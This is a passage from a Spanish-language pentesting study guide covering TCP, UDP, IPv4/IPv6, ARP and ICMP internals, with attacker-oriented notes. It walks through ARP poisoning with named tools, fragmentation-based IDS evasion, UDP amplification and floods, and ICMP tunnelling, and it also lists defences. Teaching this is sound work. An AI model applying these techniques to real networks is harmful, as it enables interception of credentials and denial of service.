- La ventana efectiva es min(rwnd, cwnd)

**TCP Slow Start (arranque lento):**
- Empieza con cwnd = 1 segmento (MSS)
- Por cada ACK recibido, cwnd aumenta en 1 MSS (crecimiento exponencial)
- Hasta llegar a ssthresh (slow start threshold)
- Después de ssthresh, pasa a Congestion Avoidance (crecimiento lineal)

**TCP Congestion Avoidance:**
- cwnd aumenta en 1 MSS por RTT (lineal, no exponencial)
- AIMD (Additive Increase, Multiplicative Decrease)
- Si hay pérdida (timeout o 3 DupACKs), cwnd baja drásticamente

**Fast Retransmit:**
- Si el receptor recibe un segmento fuera de orden, envía un ACK duplicado
- Si el emisor recibe 3 DupACKs del mismo seq, retransmite inmediatamente
- Sin esperar el timeout

**Fast Recovery:**
- Después de fast retransmit, no vuelve a slow start
- Entra en fast recovery: cwnd = ssthresh, luego AIMD

**Para el pentester:**
- Ventanas muy pequeñas → baja performance, posible [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting)
- Ventanas enormes → conexiones rápidas, posible [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)
- Si ves cwnd = 1 constante, hay un [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) o algo limitando
- En ataques de bandwidth exhaustion, querés ventanas grandes para saturar
- Zero Window Attack: mantener la ventana en 0 para DoS de la conexión

#### TCP Retransmission y Timeout

TCP usa un timer de retransmisión (RTO - Retransmission Timeout). Si no recibe ACK antes del timeout, retransmite.

**RTO Calculation (Jacobson's algorithm, RFC 6298):**
```
SRTT = (1 - α) * SRTT + α * RTT (estimación suavizada)
RTTVAR = (1 - β) * RTTVAR + β * |SRTT - RTT| (variación)
RTO = SRTT + 4 * RTTVAR
```
- α = 1/8 (0.125)
- β = 1/4 (0.25)
- RTO mínimo: 1 segundo (RFC 6298), algunos SO lo bajan a 200ms
- RTO máximo: 60 segundos (típico)
- Karn's algorithm: no usar ACKs de retransmisiones para calcular RTT
- Exponential backoff: si hay timeout, el próximo RTO se duplica

**DupACK (Duplicate ACK):**
- El receptor recibe un segmento con seq mayor al esperado
- Responde con un ACK del número que espera (no el que recibió)
- Si recibe 3 DupACKs iguales → Fast Retransmit

**SACK (Selective Acknowledgment, RFC 2018):**
- Permite al receptor informar QUÉ bytes recibió, no solo el próximo esperado
- Mejora performance cuando se pierden segmentos no consecutivos
- Opción TCP negociada en el handshake

**TCP Timestamps (RFC 7323):**
- Opción TSopt con dos propósitos:
  1. RTTM (Round-Trip Time Measurement): medir RTT con precisión
  2. PAWS (Protection Against Wrapped Sequences): para conexiones > 4 GB/s

**Sequence Number Wrapping:**
- Sequence number es de 32 bits (0 a 4,294,967,295)
- En conexiones rápidas (>4 Gbps), los seq numbers se "wrappean"
- PAWS usa timestamps para distinguir paquetes nuevos de viejos envueltos
- En TCP normal, ~4.3 GB de datos antes de wrapper

#### Sequence y Acknowledgment Numbers en Detalle

**Sequence Number (32 bits, 0 a 4,294,967,295):**
- En el SYN inicial: ISN (aleatorio)
- En segmentos posteriores: ISN + offset de bytes enviados
- Se "wrappean" (vuelven a 0) después de ~4 GB de datos
- Cada byte de datos tiene su propio seq number
- Si enviás 1000 bytes con seq=5000, el próximo seq será 6000
- SYN y FIN también consumen 1 byte del seq space (por eso el ACK del SYN es ISN+1)

**Acknowledgment Number:**
- Siempre es el próximo seq que el receptor espera
- Es el seq del último byte recibido + 1
- Es acumulativo: ACK=6000 significa "recibí todo hasta byte 5999"
- Los DupACKs tienen el mismo ack number (el que falta)

**Caso confuso común:**
- Cliente envía SYN seq=1000
- Servidor responde SYN-ACK seq=5000, ack=1001
- ¿Por qué 1001? Porque el SYN consume un seq number. El server ACK el SYN confirmando que espera el byte 1001.
- Misma lógica para FIN: después de FIN, el seq avanza en 1.

### UDP (User Datagram Protocol) — En Detalle

UDP es el hermano "liviano" de TCP. Sin conexión, sin garantía, sin control de flujo, sin ordenamiento. Pero rápido.

#### Header UDP — 8 bytes

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Puerto Origen         |        Puerto Destino         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Length            |           Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

| Campo | Tamaño | Descripción |
|-------|--------|-------------|
| Puerto Origen | 16 bits | Puerto de origen (0 si no se usa) |
| Puerto Destino | 16 bits | Puerto destino |
| Length | 16 bits | Header + datos (mínimo 8) |
| Checksum | 16 bits | Opcional en IPv4, obligatorio en IPv6 |

**Características:**
- Sin conexión: no hay handshake, se mandan datagramas directamente
- Sin confiabilidad: no hay ACKs, no hay retransmisión
- Sin orden: los datagramas pueden llegar en cualquier orden (o no llegar)
- Sin control de flujo: el emisor puede saturar al receptor
- Sin control de congestión: el emisor no sabe si la red está congestionada
- Overhead mínimo: 8 bytes de header vs 20-60 de TCP
- Soporta broadcast y multicast (TCP no)

#### UDP vs TCP — Comparación

| Característica | TCP | UDP |
|---------------|-----|-----|
| Conexión | Orientado (handshake) | Sin conexión |
| Confiabilidad | Entrega garantizada | Sin garantía |
| Orden | Ordenado | Sin ordenar |
| Control de flujo | Sí (window) | No |
| Control de congestión | Sí | No |
| Checksum | Obligatorio | Opcional (IPv4) |
| Header | 20-60 bytes | 8 bytes |
| Overhead | Alto | Bajo |
| Velocidad | Más lento | Más rápido |
| Uso típico | Web, email, SSH, FTP | DNS, VoIP, streaming, gaming, [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp) |

**¿Cuándo usar UDP en vez de TCP?**

TCP es mejor cuando:
- Necesitás que los datos lleguen completos y en orden (web, archivos, email)
- Podés tolerar latencia pero no pérdida
- La aplicación requiere stream de datos confiable

UDP es mejor cuando:
- La velocidad es más importante que la confiabilidad (video en vivo, gaming)
- Podés tolerar pérdida de paquetes (un frame perdido en video = pixel corrupto por un instante)
- Necesitás multicast/broadcast (TCP no soporta)
- El mensaje entra en un paquete y no necesitás conexión (DNS query, NTP)

**Para el pentester:**
- DNS, SNMP, DHCP, TFTP, NTP, SIP, QUIC, RIP usan UDP
- Escaneo UDP es más lento y menos confiable que TCP
- UDP scan en nmap: `-sU` (manda datagramas UDP a cada puerto)
- Como UDP no tiene handshake, es más fácil de spoofear (IP spoofing)
- **Amplification attacks**: DNS, NTP, SSDP, Memcached, SNMP explotan UDP sin verificación de origen
- **UDP flood**: enviar muchos datagramas UDP al azar, satura el servidor que debe [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) ICMP Unreachable por cada puerto cerrado

### IP (Internet Protocol) — En Detalle

#### IPv4 — Estructura del Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |      DSCP/ECN      |        Total Length       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification          |Flags|  Fragment Offset       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol    |        Header Checksum        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if any)                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Data (Payload)                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Campos en detalle:**

1. **Version (4 bits):** 4 para IPv4, 6 para IPv6.
2. **IHL (Internet Header Length, 4 bits):** Largo del header en palabras de 32 bits. Mínimo 5 (20 bytes sin opciones), máximo 15 (60 bytes con opciones).
3. **DSCP/ECN (8 bits):**
   - DSCP (Differentiated Services Code Point): 6 bits para QoS (clase de servicio). Define prioridad del tráfico.
   - ECN (Explicit Congestion Notification): 2 bits. Permite notificar congestión sin descartar paquetes.
     - 00: No ECT (not ECN-capable)
     - 01: ECT(1) — ECN-capable transport
     - 10: ECT(0) — ECN-capable transport
     - 11: CE (Congestion Experienced)
4. **Total Length (16 bits):** Tamaño total del paquete (header + datos) en bytes. Máximo 65535.
5. **Identification (16 bits):** Identificador único del paquete. Se usa para fragmentación — todos los fragmentos comparten el mismo ID.
6. **Flags (3 bits):**
   - Bit 0: Reserved (siempre 0)
   - Bit 1: DF (Don't Fragment) — si es 1, no fragmentar
   - Bit 2: MF (More Fragments) — si es 1, hay más fragmentos después de este
7. **Fragment Offset (13 bits):** Desplazamiento de este fragmento dentro del datagrama original, en unidades de 8 bytes.
8. **TTL (Time to Live, 8 bits):** Número de saltos máximo. Se decrementa en cada [router](../raw/r3d3s-f0nd4m3nt0s.md#routers). Si llega a 0, el [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) descarta el paquete y envía ICMP Time Exceeded.
   - TTL inicial típico: 64 (Linux), 128 (Windows), 255 (routers Cisco, Solaris), 60 (macOS)
   - Podés determinar el SO aproximado por el TTL inicial (fingerprinting pasivo)
9. **Protocol (8 bits):** Identifica el protocolo de capa superior.
   - 1 = ICMP
   - 6 = TCP
   - 17 = UDP
   - 2 = IGMP
   - 89 = [ospf](../raw/r3d3s-4v4nz4d4s.md#ospf)
   - 132 = SCTP
   - 50 = ESP (IPSec)
   - 51 = AH (IPSec)
   - 47 = GRE
   - 41 = IPv6-in-IP
   - 88 = EIGRP
   - 112 = VRRP
10. **Header Checksum (16 bits):** Checksum del header IP (NO de los datos). Se recalcula en cada router (porque TTL cambia). IPv6 eliminó el checksum.
11. **Source Address (32 bits):** IP de origen.
12. **Destination Address (32 bits):** IP de destino.
13. **Options (0-40 bytes):** Opciones IP.

**IP Options que importan en hacking:**
- **Loose Source Route (LSR):** El paquete especifica routers por los que debe pasar. Las rutas podían ser "saltos sugeridos". Obsoleto por seguridad.
- **Strict Source Route (SSR):** El paquete especifica EXACTAMENTE la ruta. Muy peligroso. La mayoría de routers bloquean paquetes con source route hoy.
- **Record Route:** Cada router agrega su IP al paquete. Útil para traceroute.
- **Timestamp:** Registrar la hora en cada router. Útil para troubleshooting.
- **Router Alert:** Le dice al router que inspeccione el paquete (RSVP, MLD).

**Source Routing en hacking:**
- Si el router destino acepta source routing, podés spoofear [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) y hacer que la respuesta vuelva a vos
- Por ejemplo: ponés source IP = víctima, pero source route = [tu_IP]. El paquete va a destino y la respuesta vuelve por tu IP.
- Todos los sistemas modernos bloquean source routing por defecto

#### Fragmentación IP

La fragmentación ocurre cuando un paquete es más grande que la MTU del enlace de salida.

**[proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de fragmentación:**
1. El paquete original se divide en fragmentos más pequeños
2. Cada fragmento tiene su propio header IP (copia del original con campos modificados)
3. Todos los fragmentos tienen el mismo **Identification**
4. **MF (More Fragments) = 1** en todos menos el último
5. **Fragment Offset** indica la posición del fragmento en el datagrama original (en unidades de 8 bytes)
6. El destino reensambla usando ID + offset

**Ejemplo:**
Paquete IP de 4000 bytes (header 20 + datos 3980), MTU del próximo enlace = 1500.
Fragmentos resultantes:
- Fragmento 1: header 20 + datos 1480, offset=0, MF=1
- Fragmento 2: header 20 + datos 1480, offset=185 (1480/8), MF=1
- Fragmento 3: header 20 + datos 1020 (3980-1480-1480), offset=370, MF=0

**Problemas de seguridad con fragmentación:**
- **Fragment Overlap/Teardrop:** Fragmentos solapados causaban crash en sistemas viejos (Win95, Linux 2.0). Enviás fragmentos con offsets que se superponen y el reensamblaje falla catastróficamente.
- **Fragment Overlap [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips) Evasion:** Dividí un paquete malicioso en fragmentos para que el [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips) no pueda detectarlo. Si el destino reensambla diferente al [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips), evadís la detección.
- **Tiny Fragment Attack:** Fragmento tan chico que el header de capa 4 cruza en dos fragmentos. El firewall no puede ver el puerto destino si está en el segundo fragmento.
- **Fragmentación UDP:** Común en ataques DNS amplification (respuestas gigantes).
- **PMTUD (Path MTU Discovery):** Descubrí la MTU del camino entero. Si falla (ICMP bloqueado), tenés problemas de conectividad con paquetes grandes.

**Dónde fragmenta:**
- IPv4: puede fragmentar el origen O cualquier router en el camino
- IPv6: solo el origen fragmenta (no routers intermedios)

#### IPv4 Address Format

32 bits, representados como 4 octetos decimales separados por puntos.
Ejemplo: `192.168.1.1`

Cada octeto va de 0 a 255 (8 bits).

```
192.168.1.1
11000000.10101000.00000001.00000001
```

### IPv6

#### IPv6 — Address Format

128 bits, representados como 8 grupos de 4 dígitos hexadecimales separados por dos puntos.
Ejemplo: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`

**Reglas de compresión:**
1. Los ceros iniciales en un grupo se omiten: `2001:0db8` → `2001:db8`
2. Una secuencia de 2+ grupos de ceros se reemplaza con `::` (solo una vez)
   - `2001:db8:0:0:0:0:0:1` → `2001:db8::1`
   - `fe80:0:0:0:0:0:0:1` → `fe80::1`
   - `::1` = loopback
   - `::` = unspecified (all zeros)

**Tipos de direcciones IPv6:**
- **Global Unicast (2000::/3):** Como las IPs públicas de IPv4. Únicas en todo Internet.
- **Link-Local (fe80::/10):** Comunicación dentro del mismo enlace. No routed. Se autogeneran. Siempre empiezan con fe80.
- **Unique Local (fc00::/7):** Como las IPs privadas de IPv4 (192.168.x.x, 10.x.x.x). Para [redes](../raw/r3d3s-f0nd4m3nt0s.md) internas.
- **Multicast (ff00::/8):** Como 224.0.0.0/4 en IPv4. ff02::1 = all nodes, ff02::2 = all routers.
- **Loopback (::1):** Como 127.0.0.1.
- **Unspecified (::):** Como 0.0.0.0.
- **IPv4-mapped (::ffff:0:0/96):** `::ffff:192.168.1.1` para representar IPv4 en IPv6.

**Estructura de una Global Unicast Address:**
```
| 001 (FP) | TLA ID (13 bits) | Res (8 bits) | NLA ID (24 bits) | SLA ID (16 bits) | Interface ID (64 bits) |
| Global Routing Prefix (48 bits) | Subnet ID (16 bits) | Interface ID (64 bits) |
```

**IPv6 Header (40 bytes fijos, sin opciones en el header base):**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| Traffic Class |           Flow Label                  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Payload Length        |  Next Header  |  Hop Limit     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                       Source Address                          +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                    Destination Address                        +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**IPv6 Header fields:**
- **Version (4 bits):** 6
- **Traffic Class (8 bits):** Similar a DSCP/ECN de IPv4
- **Flow Label (20 bits):** Identifica un flujo específico para QoS
- **[payload](../raw/m3t4spl01t.md#payloads) Length (16 bits):** Tamaño del [payload](../raw/m3t4spl01t.md#payloads) (no incluye el header de 40 bytes)
- **Next Header (8 bits):** Identifica el próximo header (puede ser un extension header o un protocolo de capa superior)
  - 0 = Hop-by-Hop Options
  - 6 = TCP
  - 17 = UDP
  - 43 = Routing
  - 44 = Fragment
  - 50 = ESP
  - 51 = AH
  - 58 = ICMPv6
  - 59 = No Next Header
- **Hop Limit (8 bits):** Reemplaza TTL. Misma función: decrementa en cada router.
- **Source Address (128 bits):** IP origen.
- **Destination Address (128 bits):** IP destino.

**IPv6 Extension Headers:**
- **Hop-by-Hop Options:** Opciones que cada router debe procesar. Jumbo frames, MLD.
- **Destination Options:** Opciones para el destino final.
- **Routing (Type 0, deprecado):** Reemplazó Loose Source Route. Deprecado por seguridad (similar a source routing).
- **Fragment:** Para fragmentación. Solo el origen fragmenta.
- **Authentication Header (AH):** Integridad y autenticación (IPSec).
- **Encapsulating Security Payload (ESP):** [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) + autenticación (IPSec).
- **Mobility (MIPv6):** Para móviles que cambian de red.
- **No Next Header (59):** Indica que no hay más headers.

**Procesamiento de Extension Headers:**
Los extension headers se encadenan. Cada uno tiene un campo Next Header que apunta al próximo.
```
[IPv6 Header, Next=43] → [Routing Header, Next=44] → [Fragment Header, Next=6] → [TCP]
```

**IPv6 vs IPv4 — Diferencias clave:**

| IPv4 | IPv6 |
|------|------|
| 32 bits (4.3B direcciones) | 128 bits (340 undecillones direcciones) |
| Header [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) (20-60 bytes) | Header fijo (40 bytes) |
| Checksum en header | Sin checksum en capa 3 |
| [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) es necesario (falta de direcciones) | [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) no necesario |
| Broadcast nativo | Multicast + Anycast reemplazan broadcast |
| ARP externo | NDP (Neighbor Discovery Protocol) integrado en ICMPv6 |
| Fragmentación en routers | Fragmentación solo en origen |
| TTL | Hop Limit (mismo concepto) |
| Opciones en header principal | Extension Headers separados |
| No requiere soporte de seguridad | IPsec es parte del estándar |
| DHCP común | SLAAC (autoconfiguración sin estado) |

**SLAAC (Stateless Address Autoconfiguration):**
- El host genera su propia IPv6 usando el prefix anunciado por el router + su MAC (EUI-64)
- EUI-64: toma la MAC de 48 bits, inserta FFFE en el medio, invierte el bit 7
- MAC: 00:1A:3F:12:34:56 → EUI-64: 021A:3FFF:FE12:3456
- Privacy Extensions (RFC 4941): genera direcciones temporales aleatorias para privacidad

**Principales problemas de seguridad IPv6:**
- **Espacio masivo:** escaneo manual de IPv6 es casi imposible (tardarías años)
- **Sin ARP:** no hay [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing) clásico, pero hay NDP spoofing mediante Router Advertisement falsos
- **SLAAC puede revelar MAC** (aunque privacy extensions ayudan)
- **Extension Headers** pueden ser usados para evadir firewalls (muchos firewalls no inspeccionan correctamente una cadena larga de extension headers)
- IPv6 suele estar **habilitado pero desatendido** en servidores → vector de ataque
- **Teredo/6to4/ISATAP:** túneles IPv6 sobre IPv4 que bypassan firewalls
- **Router Advertisement spoofing:** un atacante en la LAN anuncia ser router y todo el tráfico pasa por él

### ARP (Address Resolution Protocol)

ARP mapea direcciones IP a direcciones MAC dentro de una red local (capa 3 a capa 2).

**¿Por qué necesitamos ARP?**
- Las IPs son direcciones lógicas (capa 3)
- Las MACs son direcciones físicas (capa 2)
- Para comunicarse dentro de la misma LAN, necesitás la MAC del destino
- ARP es el puente entre IP y MAC

**Formato del paquete ARP:**
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       HW Type (Ethernet=1)    |    Protocol Type (IPv4=0x0800)|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| HW Addr Len  | Proto Addr Len|       Opcode (1=Req, 2=Reply) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Sender MAC Address (6B)                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Sender IP Address (4B)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Target MAC Address (6B)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Target IP Address (4B)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Funcionamiento:**

1. **ARP Request (Broadcast):**
   - El host A necesita saber la MAC de 192.168.1.5
   - Envía un paquete ARP con:
     - Sender MAC: AA:AA:AA:AA:AA:AA
     - Sender IP: 192.168.1.2
     - Target MAC: 00:00:00:00:00:00 (desconocido)
     - Target IP: 192.168.1.5
     - Opcode: 1 (Request)
   - La MAC destino del frame Ethernet: FF:FF:FF:FF:FF:FF (broadcast)

2. **ARP Reply (Unicast)**
   - Todos reciben el broadcast. Solo 192.168.1.5 responde.
   - Responde con:
     - Sender MAC: BB:BB:BB:BB:BB:BB
     - Sender IP: 192.168.1.5
     - Target MAC: AA:AA:AA:AA:AA:AA
     - Target IP: 192.168.1.2
     - Opcode: 2 (Reply)

3. **ARP Cache:**
   - El host A guarda la entrada: 192.168.1.5 → BB:BB:BB:BB:BB:BB
   - TTL típico: 20 minutos (Linux), 2 minutos (Windows para hosts fuera de subnet)
   - Se puede ver con `arp -a` (Windows/Linux)

**ARP Cache Table:**
```
Dirección IP        MAC                Tipo
192.168.1.1        aa:bb:cc:dd:ee:ff  Dinámico
192.168.1.5        bb:bb:bb:bb:bb:bb  Dinámico
192.168.1.10       11:22:33:44:55:66  Estático (manual)
```

**Gratuitous ARP (GARP):**
- Un host envía un ARP Request anunciando su propia IP
- Target IP = Sender IP (es para sí mismo)
- Propósitos legítimos:
  - Detectar IP duplicada (DAD - Duplicate Address Detection)
  - Actualizar tablas ARP de otros hosts después de un cambio de MAC
  - Anunciar disponibilidad en clustering (heartbeat, failover)
- **USO EN HACKING:** envenenar ARP caches con una MAC falsa

**ARP Spoofing / ARP Poisoning (en detalle):**

El ataque [mitm](../raw/m1tm-m0b1l3.md) ([man-in-the-middle](../raw/m1tm-m0b1l3.md)) más clásico de capa 2.

**Escenario:** Red con Víctima A (192.168.1.5), Víctima B (192.168.1.10), Atacante (192.168.1.20).

**Paso 1:** Atacante envía ARP Reply (falsificado) a Víctima A:
- Sender IP: 192.168.1.10 (mintiendo, es la IP de B)
- Sender MAC: MAC_del_atacante
- Target IP: 192.168.1.5

**Paso 2:** Atacante envía ARP Reply (falsificado) a Víctima B:
- Sender IP: 192.168.1.5 (mintiendo, es la IP de A)
- Sender MAC: MAC_del_atacante
- Target IP: 192.168.1.10

**Resultado:**
- En la tabla ARP de A: 192.168.1.10 → MAC_atacante
- En la tabla ARP de B: 192.168.1.5 → MAC_atacante
- Todo el tráfico entre A y B pasa por el atacante

**El atacante puede:**
- Sniffear todo el tráfico (passive)
- Modificar paquetes en vuelo (active mitm)
- Hacer [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) stripping (downgrade de [https](../raw/r3d3s-f0nd4m3nt0s.md#https) a HTTP)
- Capturar credenciales
- Inyectar contenido malicioso (malware, javascript)

**Herramientas:**
- `arpspoof` (parte de dsniff suite)
- `ettercap` (ARP poisoning + plugins)
- `bettercap` (suite moderna con ARP, HTTP, HTTPS, [dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing))
- `arpspoof` + `mitmproxy` para MITM con manipulación de contenido

**Defensas contra ARP spoofing:**
- **ARP estático:** Entradas manuales en la tabla ARP. Imposible de envenenar.
- **DAI (Dynamic ARP Inspection):** En switches Cisco. Verifica ARP contra el DHCP snooping binding database.
- **ARPwatch:** Monitorea cambios en tablas ARP y alerta.
- **S-ARP:** ARP con firma criptográfica (poco usado en producción).
- **Segmentación de red:** VLANs limitan el broadcast domain de ARP.
- **MACsec (802.1AE):** Cifrado a nivel de enlace, protege contra modificación de ARP.

**ARP en IPv6:** NDP (Neighbor Discovery Protocol) usando ICMPv6:
- Neighbor Solicitation (NS) → reemplaza ARP Request
- Neighbor Advertisement (NA) → reemplaza ARP Reply
- Router Solicitation (RS) / Router Advertisement (RA)
- **NDP spoofing:** similar a ARP spoofing pero con mensajes ICMPv6
### ICMP (Internet Control Message Protocol)

ICMP es el protocolo de "control y mensajes de error" de IP. Opera en capa 3 (sobre IP, protocolo 1). NO es usado para transportar datos de aplicación (aunque se puede tunelizar).

**Estructura del mensaje ICMP:**
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |      Code     |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Rest of Header (depende del tipo)          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    ICMP Payload / Data                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Tipos de mensajes ICMP (los que importan para hacking):**

| Type | Code | Nombre | Descripción |
|------|------|--------|-------------|
| 0 | 0 | Echo Reply | Respuesta a ping. Te dice si un host está vivo. |
| 3 | 0 | Dest Unreachable (Net) | Red destino inalcanzable |
| 3 | 1 | Dest Unreachable (Host) | Host destino inalcanzable |
| 3 | 2 | Dest Unreachable (Protocol) | Protocolo no soportado |
| 3 | 3 | Dest Unreachable (Port) | Puerto destino inalcanzable (UDP) |
| 3 | 4 | Frag Needed DF [set](../raw/ph1sh1ng.md#social-engineering-toolkit) | Fragmentación necesaria pero DF activo (PMTUD) |
| 3 | 6 | Dest Network Unknown | Red destino desconocida |
| 3 | 7 | Dest Host Unknown | Host destino desconocido |
| 3 | 9 | Dest Network Prohibited | Red destino prohibida (firewall) |
| 3 | 10 | Dest Host Prohibited | Host destino prohibido (firewall) |
| 3 | 13 | Comm Admin Prohibited | Comunicación prohibida administrativamente |
| 4 | 0 | Source Quench | Control de congestión (obsoleto, pero algunos lo usan) |
| 5 | 0 | Redirect (Network) | Redirigir tráfico a otra red (potencial ataque) |
| 5 | 1 | Redirect (Host) | Redirigir tráfico a otro host (potencial ataque) |
| 8 | 0 | Echo Request | Ping request |
| 9 | 0 | Router Advertisement | Router anuncia su presencia |
| 10 | 0 | Router Solicitation | Host busca routers en la red |
| 11 | 0 | TTL Exceeded (Time to Live) | TTL llegó a 0 (traceroute) |
| 11 | 1 | Fragment Reassembly Time Exceeded | Tiempo de reensamblaje excedido |
| 12 | 0 | Parameter Problem: Bad IP Header | Header IP inválido |
| 13 | 0 | Timestamp Request | Solicitar timestamp |
| 14 | 0 | Timestamp Reply | Timestamp reply |
| 17 | 0 | Address Mask Request | Solicitar máscara de [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes) |
| 18 | 0 | Address Mask Reply | Máscara de subred (peligroso si es pública) |

**ICMP en hacking:**

**Ping Sweep (ICMP Echo):**
- Enviar ICMP Echo Request a un rango de IPs
- Si recibís Echo Reply, el host está vivo
- `nmap -sn 192.168.1.0/24` (ping sweep)
- Problema: firewalls suelen bloquear ICMP Echo
- Alternativas: TCP ping a puertos comunes (-PS80, -PA80), ARP ping (en LAN), SYN ping

**Traceroute (ICMP TTL Exceeded):**
- Enviar paquetes con TTL incrementales (1, 2, 3...)
- Cada router decrementa TTL. Cuando llega a 0, devuelve ICMP TTL Exceeded (type 11)
- La IP del router que responde es un salto en la ruta
- En Windows: ICMP Echo Request con TTL incremental (`tracert`)
- En Linux: UDP a puertos altos con TTL incremental (`traceroute`)
- En ambos, se puede usar TCP SYN con TTL incremental (`tcptraceroute`)
- Para evadir firewalls, `traceroute -I` usa ICMP, `-T` usa TCP SYN

**PMTUD (Path MTU Discovery) usando ICMP:**
- Enviar paquetes con DF=1 (Don't Fragment)
- Si un enlace en el camino tiene MTU menor, el router descarta el paquete y devuelve ICMP Type 3 Code 4 (Frag Needed DF Set)
- El emisor reduce el tamaño y reintenta
- **Ataque:** algunos firewalls bloquean ICMP Type 3 Code 4 → el emisor nunca sabe que debe reducir → conexión rota para paquetes grandes
- **Ataque ICMP Type 3 Code 4 spoofing:** si podés falsificar este mensaje con una MTU chica, hacés que todas las conexiones usen MTU=576, degradando performance

**ICMP Tunnel:**
- Podés encapsular datos en ICMP Echo Request/Reply
- Lo usan herramientas como `ptunnel`, `icmptx`, `pingtunnel`, `Hans`
- Útil cuando todo está bloqueado menos ICMP (redes corporativas restrictivas)
- El servidor escucha ICMP Echo Request, extrae datos del payload, responde con datos en Echo Reply
